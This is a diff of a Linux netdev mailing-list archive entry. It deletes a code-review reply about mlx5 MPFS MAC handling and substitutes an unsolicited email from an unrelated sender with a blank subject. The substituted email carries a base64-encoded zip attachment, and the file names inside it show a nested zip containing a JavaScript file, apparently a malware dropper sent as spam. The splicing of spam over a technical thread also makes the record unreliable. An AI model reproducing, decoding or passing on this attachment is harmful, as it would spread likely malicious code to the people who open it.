@@ -1,48 +1,103 @@
-From: Or Gerlitz <gerlitz.or@gmail.com>
-Subject: Re: [PATCH RFC net-next 3/4] net/mlx5: Separate between eswitch and
- MPFS l2 table logic
-Date: Thu, 8 Jun 2017 14:12:08 +0300
-Message-ID: <CAJ3xEMjaCG-VMdvmVAVCnYoiNp1bBHotyrefhfcgG0Ortqx3gQ@mail.gmail.com>
-References: <20170607234214.24723-1-saeedm@mellanox.com> <20170607234214.24723-4-saeedm@mellanox.com>
- <CAJ3xEMi9+iaa3CCA-gdBC7Okz3KgpWbea-vvfYEJFpTQkboxUA@mail.gmail.com> <CALzJLG-wha9D0Ybnu3mAPB8RaDYnfidj2dz81rmdiJzRjw7yCw@mail.gmail.com>
+From: <helga.brickl@arcor.de>
+Subject: (unknown)
+Date: Thu, 08 Jun 2017 11:31:53 -0000
+Message-ID: <149692151388.23067.14912493439779445124@vnpt.vn>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Cc: Saeed Mahameed <saeedm@mellanox.com>,
-        Linux Netdev List <netdev@vger.kernel.org>,
-        Jes Sorensen <jsorensen@fb.com>,
-        Kernel Team <kernel-team@fb.com>,
-        Or Gerlitz <ogerlitz@mellanox.com>
-To: Saeed Mahameed <saeedm@dev.mellanox.co.il>
+Content-Type: application/zip; name="529462.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-ot0-f179.google.com ([74.125.82.179]:34709 "EHLO
-        mail-ot0-f179.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1750788AbdFHLMJ (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Thu, 8 Jun 2017 07:12:09 -0400
-Received: by mail-ot0-f179.google.com with SMTP id t31so21493056ota.1
-        for <netdev@vger.kernel.org>; Thu, 08 Jun 2017 04:12:09 -0700 (PDT)
-In-Reply-To: <CALzJLG-wha9D0Ybnu3mAPB8RaDYnfidj2dz81rmdiJzRjw7yCw@mail.gmail.com>
+Received: from static.vnpt.vn ([14.187.66.251]:41566 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751383AbdFHLcD (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Thu, 8 Jun 2017 07:32:03 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-On Thu, Jun 8, 2017 at 1:26 PM, Saeed Mahameed
-<saeedm@dev.mellanox.co.il> wrote:
-> On Thu, Jun 8, 2017 at 12:13 PM, Or Gerlitz <gerlitz.or@gmail.com> wrote:
-
-
->>> +int mlx5_mpfs_add_mac(struct mlx5_core_dev *dev, u8 *mac)
->>> +{
->>
->>> +       if (!MLX5_VPORT_MANAGER(dev))
->>> +               return 0;
->>> +
->>> +       if (is_multicast_ether_addr(mac))
->>> +               return 0;
-
->> It would have been much better reviewed and maintained if we can code
->> things in a manner under which we don't get here if not appropriate and
->> not simulate successful return.
-
-> Sure, will consider that, i just wanted to avoid ugly indentations in
-> mlx5e set_rx_mode en_fs.c
-
-I understand your concern re ugly indentations, but hopefully we can avoid them
+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
+4NIBUEsFBgAAAAABAAEAWgAAAF0SAAAAAA==
